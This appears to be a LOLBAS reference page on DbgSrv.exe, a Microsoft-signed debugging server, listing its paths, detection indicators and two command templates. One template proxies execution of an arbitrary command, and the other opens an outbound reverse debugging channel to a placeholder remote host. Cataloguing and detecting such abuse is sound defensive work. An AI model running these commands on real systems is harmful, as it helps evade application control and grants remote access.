---
title: "DbgSrv.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dbgsrv/
fetched_at: 2026-09-20T17:14:33Z
license: unspecified
category: windows
---

A process server included with Debugging Tools for Windows for remote user-mode debugging.

## Paths
- C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\dbgsrv.exe
- C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\dbgsrv.exe
- C:\Program Files\Debugging Tools for Windows (x64)\dbgsrv.exe
- C:\Program Files\Debugging Tools for Windows (x86)\dbgsrv.exe

## Resources
- [https://github.com/user-attachments/assets/ff08bc79-4cca-4bf8-b659-7025a99c443f](https://github.com/user-attachments/assets/ff08bc79-4cca-4bf8-b659-7025a99c443f)
- [https://github.com/LOLBAS-Project/LOLBAS/pull/516#issuecomment-5116289639](https://github.com/LOLBAS-Project/LOLBAS/pull/516#issuecomment-5116289639)
- [https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/dbgsrv-command-line-options](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/dbgsrv-command-line-options)
- [https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/activating-a-process-server](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/activating-a-process-server)
- [https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools)
- [https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol)
- [https://redcanary.com/blog/threat-detection/black-hat-detecting-the-unknown-and-disclosing-a-new-attack-technique/](https://redcanary.com/blog/threat-detection/black-hat-detecting-the-unknown-and-disclosing-a-new-attack-technique/)
- [https://gist.github.com/analyticsearch/de5c05229d5bf4f8c72016a2a43034eb](https://gist.github.com/analyticsearch/de5c05229d5bf4f8c72016a2a43034eb)

## Acknowledgements
- PHYO PAING HTUN ([@ChiLaikhun](https://twitter.com/@ChiLaikhun))

## Detections
- IOC: DbgSrv.exe spawning a child process after execution with the -c option.
- IOC: DbgSrv.exe command lines containing -c, -pc, clicon=, or hidden.
- IOC: DbgSrv.exe establishing an unexpected outbound connection to an external host.
- IOC: DbgSrv.exe communicating over ports that are not approved for remote debugging.
- IOC: DbgSrv.exe executed from outside an expected Windows Kits or Debugging Tools directory.
- IOC: DbgSrv.exe spawning a command interpreter, script engine, or executable from a user-writable directory.
- IOC: A normally network-inactive process, such as notepad.exe, initiating an external connection shortly after DbgSrv.exe establishes a connection to the same host or infrastructure.
- IOC: DbgSrv.exe launched by explorer.exe on a system where interactive remote debugging is not expected.
- BlockRule: [https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/applications-that-can-bypass-appcontrol)

## Execute

1. Creates a process server and launches the specified command using the DbgSrv.exe -c option.

```
dbgsrv.exe -t tcp:port=5005 -c {CMD}
```

   - Use case: Proxy execution of a command through a trusted Microsoft-signed debugging utility.

   - Privileges required: User

   - Operating systems: Windows

   - ATT&CK® technique: T1127

   - Tags: Execute: CMD

2. Establishes an outbound reverse connection from the DbgSrv process server to a remote debugging client using the clicon option. A connected debugging client can subsequently interact with processes through the remote debugging session.

```
dbgsrv.exe -t tcp:clicon={HOST},port={PORT}
```

   - Use case: Establish a reverse remote-debugging channel through a trusted Microsoft-signed developer utility.

   - Privileges required: User

   - Operating systems: Windows

   - ATT&CK® technique: T1127

   - Tags: Execute: Remote
